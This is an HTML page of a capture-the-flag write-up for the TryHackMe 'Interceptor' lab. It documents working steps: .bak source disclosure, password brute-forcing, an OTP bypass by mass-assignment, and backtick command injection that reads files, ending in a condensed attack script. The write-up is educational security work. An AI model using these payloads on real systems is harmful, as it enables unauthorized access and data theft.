@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Interceptor — TryHackMe Writeup — CyberMaks</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0b0f14; --bg-2: #0f1419; --bg-3: #141b22; --bg-code: #0d1117;
+      --border: #1e2730; --border-2: #253040;
+      --text: #c8d0da; --text-dim: #6b7a8d; --text-faint: #3a4552;
+      --accent: #4d9de0; --accent-dim: #2d6fa8;
+      --green: #34c759; --yellow: #ff9f0a; --red: #ff453a;
+      --mono: 'DM Mono', monospace; --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 640px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+    .info-value a { color: var(--accent); text-decoration: none; }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+
+    /* kill chain */
+    .kc-wrap { margin: 24px 0; }
+    .kc-phase { margin-bottom: 10px; }
+    .kc-phase-label { font-family: var(--mono); font-size: 9px; color: var(--text-faint); letter-spacing: 0.14em; text-transform: uppercase; margin-bottom: 6px; }
+    .kc-row { display: flex; align-items: center; flex-wrap: nowrap; overflow-x: auto; }
+    .kc-node { font-family: var(--mono); font-size: 10px; padding: 8px 13px; border-radius: 4px; white-space: nowrap; border: 1px solid; flex-shrink: 0; }
+    .kc-node.recon   { color: var(--accent); background: rgba(77,157,224,0.07);  border-color: rgba(77,157,224,0.25); }
+    .kc-node.creds   { color: var(--yellow); background: rgba(255,159,10,0.07);  border-color: rgba(255,159,10,0.25); }
+    .kc-node.access  { color: var(--green);  background: rgba(52,199,89,0.07);   border-color: rgba(52,199,89,0.25); }
+    .kc-node.exploit { color: var(--red);    background: rgba(255,69,58,0.07);   border-color: rgba(255,69,58,0.25); }
+    .kc-node.end     { color: #fff;          background: rgba(255,69,58,0.18);   border-color: var(--red); font-weight: 600; }
+    .kc-arr { font-size: 11px; color: var(--text-faint); padding: 0 6px; flex-shrink: 0; }
+    .kc-down { padding: 2px 0 2px 20px; font-size: 11px; color: var(--text-faint); }
+    .kc-legend { display: flex; gap: 18px; flex-wrap: wrap; margin-top: 14px; padding-top: 14px; border-top: 1px solid var(--border); }
+    .kc-leg { display: flex; align-items: center; gap: 6px; font-family: var(--mono); font-size: 10px; color: var(--text-faint); }
+    .kc-dot { width: 8px; height: 8px; border-radius: 2px; flex-shrink: 0; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; white-space: pre; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+    .cy { color: var(--yellow); }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+
+    /* dead ends table */
+    .dead-table { width: 100%; border-collapse: collapse; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; font-size: 12px; }
+    .dead-table th { background: var(--bg-3); padding: 9px 14px; text-align: left; font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+    .dead-table td { padding: 10px 14px; color: var(--text-dim); border-bottom: 1px solid var(--border); background: var(--bg-2); vertical-align: top; }
+    .dead-table tr:last-child td { border-bottom: none; }
+    .dead-table td:first-child { font-family: var(--mono); font-size: 11px; color: var(--red); }
+    .dead-table td code { font-family: var(--mono); font-size: 10px; color: var(--accent); background: rgba(77,157,224,0.08); padding: 1px 5px; border-radius: 3px; }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+    .sb code { font-family: var(--mono); font-size: 11px; color: var(--accent); background: rgba(77,157,224,0.08); padding: 1px 5px; border-radius: 3px; }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#writeups" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">Linux</span>
+    <span class="badge badge-d">Medium</span>
+  </div>
+  <h1><strong>Interceptor</strong></h1>
+  <p class="hero-desc">Source disclosure via a backup file leaks admin credentials hidden in a comment. Mass-assignment in the OTP handler bypasses 2FA entirely. A client-side-only input filter leaves the feed importer open to command injection via backtick subshells.</p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Medium</span></div>
+    <div class="info-item"><span class="info-label">OS</span><span class="info-value">Linux (Ubuntu)</span></div>
+    <div class="info-item"><span class="info-label">Stack</span><span class="info-value">Apache · PHP · JSON API</span></div>
+    <div class="info-item"><span class="info-label">Techniques</span><span class="info-value">.bak disclosure · Mass-assignment · CMDi</span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <!-- 00 KILL CHAIN -->
+  <section class="section" id="killchain">
+    <div class="s-num">00</div>
+    <h2>Kill Chain</h2>
+    <div class="kc-wrap">
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 1 — Recon</div>
+        <div class="kc-row">
+          <span class="kc-node recon">Nmap</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node recon">ffuf — content discovery</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node recon">login.php.bak found</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node creds">admin email + password policy leaked</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 2 — Authentication Bypass</div>
+        <div class="kc-row">
+          <span class="kc-node creds">brute password (40 attempts)</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node access">login success → OTP required</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">is_verified=true mass-assignment</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node access">dashboard — web flag</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 3 — RCE</div>
+        <div class="kc-row">
+          <span class="kc-node recon">feed importer — client-side filter only</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">backtick subshell injection</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">base64 exfil (bash brace workaround)</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node end">user.txt — system flag</span>
+        </div>
+      </div>
+
+      <div class="kc-legend">
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(77,157,224,0.5)"></span>Recon</span>
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(255,159,10,0.5)"></span>Credentials</span>
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(52,199,89,0.5)"></span>Access</span>
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(255,69,58,0.5)"></span>Exploitation</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 01 RECON -->
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Recon & Content Discovery</h2>
+
+    <h3>Port scan</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+nmap -sV -p- 10.112.156.155
+
+echo <span class="cs">'10.112.156.155 interceptor.thm'</span> | sudo tee -a /etc/hosts</code></pre>
+
+    <p>Three ports open: <strong>22</strong> (SSH), <strong>53</strong> (DNS — AXFR refused), <strong>80</strong> (Apache 2.4.41 — the entire challenge). All action is on port 80.</p>
+
+    <h3>Directory enumeration</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ffuf -u http://interceptor.thm/<span class="ca">FUZZ</span> \
+     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
+     -e .php -fc 404</code></pre>
+
+    <p>Interesting endpoints found:</p>
+    <div class="steps">
+      <div class="step"><div class="sn">200</div><div class="sb"><code>login.php</code> — JS-driven login form that POSTs to an API endpoint.</div></div>
+      <div class="step"><div class="sn">POST</div><div class="sb"><code>api_login.php</code> — JSON API consumed by the form. Returns <code>{ok, error}</code> on failure or <code>{ok:true, redirect}</code> on success.</div></div>
+      <div class="step"><div class="sn">302</div><div class="sb"><code>dashboard.php</code> and <code>otp.php</code> — both redirect to <code>login.php</code> until the session is fully verified.</div></div>
+      <div class="step"><div class="sn">200</div><div class="sb"><code>config.php</code> — returns 0 bytes. PHP is executing it, not serving it raw. Can't read it directly.</div></div>
+      <div class="step"><div class="sn">301</div><div class="sb"><code>uploads/</code> — directory listing enabled, contains avatar images. Not immediately useful.</div></div>
+    </div>
+
+    <p>The full auth flow looks like this:</p>
+    <pre><code><div class="ph"><span class="pl">flow</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+login.php  →  api_login.php  →  otp.php  →  verify_otp.php  →  dashboard.php</code></pre>
+
+    <div class="callout yellow">
+      <strong>Important — 1491-byte fallback:</strong> Any non-existent <code>.php</code> file returns a 200 OK with 1491 bytes — Apache silently rewrites it to <code>index.php</code>. A 200 status alone means nothing here. Always compare body sizes against this baseline when fuzzing PHP apps with fallback routing.
+    </div>
+  </section>
+
+  <!-- 02 SOURCE DISCLOSURE -->
+  <section class="section" id="bak">
+    <div class="s-num">02</div>
+    <h2>Source Disclosure via .bak File</h2>
+
+    <p>Backup files are left behind by text editors and manual deployments — they're not executed by PHP, so the web server serves them as raw text. Sweeping for common backup extensions against every known PHP file:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+for ext in .bak .swp .old .save .orig <span class="cs">"~"</span>; do
+  for base in api_login login config dashboard otp; do
+    size=$(curl -s -o /dev/null -w <span class="cs">"%{size_download}"</span> \
+        <span class="cs">"http://interceptor.thm/${base}.php${ext}"</span>)
+    <span class="ck"># anything that isn't the 1491-byte fallback is a real file</span>
+    [ <span class="cs">"$size"</span> != <span class="cs">"1491"</span> ] && [ <span class="cs">"$size"</span> != <span class="cs">"0"</span> ] && \
+        echo <span class="cs">"$base.php$ext => $size bytes"</span>
+  done
+done
+
+<span class="cg">login.php.bak => 2038 bytes</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">http — fetch the backup</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET /login.php.bak HTTP/1.1
+Host: interceptor.thm</code></pre>
+
+    <p>The file contains a developer comment that should have been removed before deployment:</p>
+
+    <pre><code><div class="ph"><span class="pl">login.php.bak — developer comment</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck">/*
+|--------------------------------------------------------------------------
+| Developer Note (temporary)
+|--------------------------------------------------------------------------
+| Admin test account for staging environment
+| Email: admin@mediahub.thm
+|
+| Password policy reminder:
+| Admin password follows company format:
+| MediaHub + any year
+|
+| TODO: remove before production deployment
+*/</span></code></pre>
+
+    <div class="callout red">
+      <strong>Two critical intel items extracted:</strong><br/>
+      ① The real admin email is <code>admin@mediahub.thm</code> — not <code>admin@interceptor.thm</code>. Every previous login attempt failed because of the wrong domain, not the wrong password.<br/>
+      ② The password format is <code>MediaHub&lt;year&gt;</code> — this collapses the entire keyspace to ~40 guesses.
+    </div>
+  </section>
+
+  <!-- 03 DEAD ENDS -->
+  <section class="section" id="deadends">
+    <div class="s-num">03</div>
+    <h2>Dead Ends — What Doesn't Work</h2>
+
+    <p>Before finding the backup file, several standard approaches were tested and failed. Worth documenting so you don't repeat them.</p>
+
+    <table class="dead-table">
+      <thead><tr><th>Attempt</th><th>Why it failed</th></tr></thead>
+      <tbody>
+        <tr><td>Response tampering</td><td>Changing <code>ok:false</code> → <code>ok:true</code> in the API response fools the client JS into redirecting — but the server-side session is never set. <code>dashboard.php</code> redirects straight back to login.</td></tr>
+        <tr><td>SQLi in email / password</td><td><code>' OR '1'='1</code> and variants — all returned <code>Invalid credentials</code>. The query is parameterised or the input is otherwise sanitised.</td></tr>
+        <tr><td>PHP type-juggling</td><td><code>email[]=...&password[]=...</code> — no effect.</td></tr>
+        <tr><td>Header injection</td><td><code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Original-URL</code>, alternative <code>Host</code> values — none bypassed auth.</td></tr>
+        <tr><td>Mass-assignment on login</td><td><code>admin=1</code>, <code>role=admin</code>, <code>is_admin=true</code>, <code>bypass=1</code> — none changed the response.</td></tr>
+        <tr><td>Probing non-existent API routes</td><td><code>api_register.php</code>, <code>api_otp.php</code>, etc. — all return the 1491-byte fallback. They don't exist.</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 04 BRUTE -->
+  <section class="section" id="brute">
+    <div class="s-num">04</div>
+    <h2>Brute-forcing the Password</h2>
+
+    <p>With the format <code>MediaHub&lt;year&gt;</code>, the entire search space is ~40 requests. No wordlist needed.</p>
+
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+for year in $(seq 1990 2030); do
+  resp=$(curl -s -X POST http://interceptor.thm/api_login.php \
+      -d <span class="cs">"email=admin@mediahub.thm&password=MediaHub${year}"</span>)
+  case <span class="cs">"$resp"</span> in
+    *Invalid*) ;;
+    *) echo <span class="cs">"[+] $year => $resp"</span> ;;
+  esac
+done
+
+<span class="cg">[+] $YEAR => {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">http — successful login request</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /api_login.php HTTP/1.1
+Host: interceptor.thm
+Content-Type: application/x-www-form-urlencoded
+
+email=admin@mediahub.thm&password=<span class="cy">$PASS</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">http — response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=3mbkf04s5enib9e3mtb0f36uhb; path=/
+
+{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}</code></pre>
+
+    <p>The <code>PHPSESSID</code> cookie is now bound to a <strong>partially authenticated</strong> session — login passed, OTP not yet verified. This cookie is what we carry into the next step.</p>
+  </section>
+
+  <!-- 05 OTP BYPASS -->
+  <section class="section" id="otp">
+    <div class="s-num">05</div>
+    <h2>OTP Bypass — Mass-Assignment</h2>
+
+    <h3>Finding the vulnerability</h3>
+    <p>Posting a random OTP to <code>verify_otp.php</code> with the partial-auth session returns an interesting response:</p>
+
+    <pre><code><div class="ph"><span class="pl">http — probe request</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /verify_otp.php HTTP/1.1
+Host: interceptor.thm
+Cookie: PHPSESSID=3mbkf04s5enib9e3mtb0f36uhb
+Content-Type: application/x-www-form-urlencoded
+
+otp=000000</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">http — response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+{"ok":false,"error":"Invalid OTP. Try again.","<span class="cy">is_verified</span>":false}</code></pre>
+
+    <div class="callout red">
+      <strong>The tell:</strong> The response includes <code>"is_verified":false</code> — a field the client JS never reads. It only checks <code>data.ok</code>. This field is leaking because the backend builds its JSON response from the same internal state array it uses to track session verification. When a server exposes its own internal state keys in the response, it's almost always reading those same keys from the request — this is the classic mass-assignment pattern.
+    </div>
+
+    <h3>The bypass</h3>
+    <p>Send <code>is_verified=true</code> alongside the OTP. The OTP value itself is irrelevant — the backend reads <code>is_verified</code> from the POST body and sets the session flag directly.</p>
+
+    <pre><code><div class="ph"><span class="pl">http — bypass request</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /verify_otp.php HTTP/1.1
+Host: interceptor.thm
+Cookie: PHPSESSID=3mbkf04s5enib9e3mtb0f36uhb
+Content-Type: application/x-www-form-urlencoded
+
+otp=000000&<span class="ca">is_verified=true</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">http — response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+{"ok":true,"message":"OTP verified. Redirecting..."}</code></pre>
+
+    <p>Note that <code>is_verified</code> is gone from the response — the session is now fully authenticated and the backend no longer needs to surface that flag.</p>
+
+    <div class="callout yellow">
+      <strong>Why variants like <code>verified=true</code> or <code>is_verified=1</code> fail:</strong> They consume the partial-auth session — the next response says "Session expired. Please login again." The session is single-use at this stage. Use the exact key and value the backend expects: <code>is_verified=true</code>. Get a fresh <code>PHPSESSID</code> from the brute-force step each time you test a variant.
+    </div>
+
+    <p>With the session fully verified, <code>dashboard.php</code> is now accessible and returns the web flag in a tooltip attribute.</p>
+  </section>
+
+  <!-- 06 RCE -->
+  <section class="section" id="rce">
+    <div class="s-num">06</div>
+    <h2>Command Injection — Feed Importer</h2>
+
+    <h3>Identifying the vector</h3>
+    <p>The dashboard exposes a "Import Feed" widget that POSTs a URL to <code>import_feed_api.php</code>. Reading the client-side JS reveals the filter:</p>
+
+    <pre><code><div class="ph"><span class="pl">javascript — client-side filter</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck">// strip semicolons, ampersands, pipes before submitting</span>
+const url = feedUrl.value.replace(<span class="cs">/[;&|]/g</span>, <span class="cs">''</span>);</code></pre>
+
+    <p>Two giveaways: the filter runs on the client only (Burp skips it entirely), and the error response renders <code>data.cmd_output</code> in a <code>&lt;pre&gt;</code> block — the backend is shelling out, almost certainly as <code>curl &lt;url&gt;</code>, and returning stdout directly.</p>
+
+    <div class="callout blue">
+      <strong>Client-side filters are not security.</strong> Any filter in JavaScript is bypassed by sending the request directly — Burp Repeater, curl, or any HTTP client. The filter must be implemented server-side. The same regex <em>is</em> also applied server-side here (stripping <code>;</code>, <code>&</code>, <code>|</code>), but <strong>backticks are not on the list</strong> — and backticks trigger command substitution in bash.
+    </div>
+
+    <h3>Confirming RCE</h3>
+    <p>Inject a backtick subshell inside the URL. The server passes the string to bash, which expands the subshell, then uses the output as part of the hostname for curl — which fails to resolve it and prints the expanded value in the error.</p>
+
+    <pre><code><div class="ph"><span class="pl">http — RCE probe</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /import_feed_api.php HTTP/1.1
+Host: interceptor.thm
+Cookie: PHPSESSID=3mbkf04s5enib9e3mtb0f36uhb
+Content-Type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2Fx.com%60id%60</code></pre>
+
+    <p>Decoded body: <code>url=http://x.com`id`</code></p>
+
+    <pre><code><div class="ph"><span class="pl">response — RCE confirmed</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl: (6) Could not resolve host: <span class="cg">uid=33(www-data)</span>
+curl: (6) Could not resolve host: <span class="cg">gid=33(www-data)</span>
+curl: (6) Could not resolve host: <span class="cg">groups=33(www-data),1002(findgroup),1003(websql)</span></code></pre>
+
+    <p>Bash expanded <code>`id`</code>, split the output on whitespace, and handed each token to curl as a hostname. Host resolution fails — but the output leaks through the error message. RCE confirmed as <code>www-data</code>.</p>
+
+    <h3>Reading the flag — bash brace expansion problem</h3>
+    <p>First attempt at reading the file directly:</p>
+
+    <pre><code><div class="ph"><span class="pl">url payload</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+url=http://x.com`cat /var/www/user.txt`</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">response — truncated flag</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl: (6) Could not resolve host: x.comTHMSYSTEM_PWNED_SUCCESSFULLY</code></pre>
+
+    <div class="callout red">
+      <strong>Bash brace expansion ate the flag.</strong> The <code>THM{...}</code> curly braces are shell metacharacters — bash interprets them as brace expansion and either expands or silently drops them before passing the string to curl. The flag text is there, but the braces are gone.
+    </div>
+
+    <h3>Workaround — base64 encode the output</h3>
+    <p>Base64 output contains only <code>[A-Za-z0-9+/=]</code> — no shell metacharacters, no brace expansion, no whitespace splitting. Encode the file contents before they touch the shell.</p>
+
+    <pre><code><div class="ph"><span class="pl">http — final exfil request</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /import_feed_api.php HTTP/1.1
+Host: interceptor.thm
+Cookie: PHPSESSID=3mbkf04s5enib9e3mtb0f36uhb
+Content-Type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2Fx.com%60base64%20%2Fvar%2Fwww%2Fuser.txt%60</code></pre>
+
+    <p>Decoded body: <code>url=http://x.com`base64 /var/www/user.txt`</code></p>
+
+    <pre><code><div class="ph"><span class="pl">response → decode locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl: (6) Could not resolve host: x.com<span class="cy">VEhNe1NZU1RFTV9QV05FRF9TVUNDRVNTRlVMTFl9Cg==</span>
+
+<span class="ck"># decode locally</span>
+echo VEhNe1NZU1RFTV9QV05FRF9TVUNDRVNTRlVMTFl9Cg== | base64 -d
+<span class="cg">THM{...}</span></code></pre>
+  </section>
+
+  <!-- 07 FULL CHAIN -->
+  <section class="section" id="chain">
+    <div class="s-num">07</div>
+    <h2>Full Attack — One-liner Chain</h2>
+
+    <pre><code><div class="ph"><span class="pl">shell — complete attack condensed</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># 1. confirm the backup exists (size ≠ 1491 fallback)</span>
+curl -s -o /dev/null -w <span class="cs">"%{size_download}\n"</span> http://interceptor.thm/login.php.bak
+
+<span class="ck"># 2. read it — grab the email and password format from the comment</span>
+curl -s http://interceptor.thm/login.php.bak
+
+<span class="ck"># 3. brute the year, save the session cookie</span>
+curl -s -c jar.txt -X POST http://interceptor.thm/api_login.php \
+    -d <span class="cs">'email=admin@mediahub.thm&password=</span><span class="cy">$PASS</span><span class="cs">'</span>
+
+<span class="ck"># 4. bypass OTP via mass-assignment</span>
+curl -s -b jar.txt -X POST http://interceptor.thm/verify_otp.php \
+    -d <span class="cs">'otp=000000&is_verified=true'</span>
+
+<span class="ck"># 5. grab the web flag from the dashboard tooltip</span>
+curl -s -b jar.txt http://interceptor.thm/dashboard.php \
+    | grep -oE <span class="cs">'THM\{[^}]+\}'</span>
+
+<span class="ck"># 6. read /var/www/user.txt via backtick injection + base64 (avoids brace expansion)</span>
+curl -s -b jar.txt -X POST http://interceptor.thm/import_feed_api.php \
+    --data-urlencode <span class="cs">'url=http://x.com`base64 /var/www/user.txt`'</span> \
+  | grep -oE <span class="cs">'[A-Za-z0-9+/=]{20,}'</span> | base64 -d</code></pre>
+
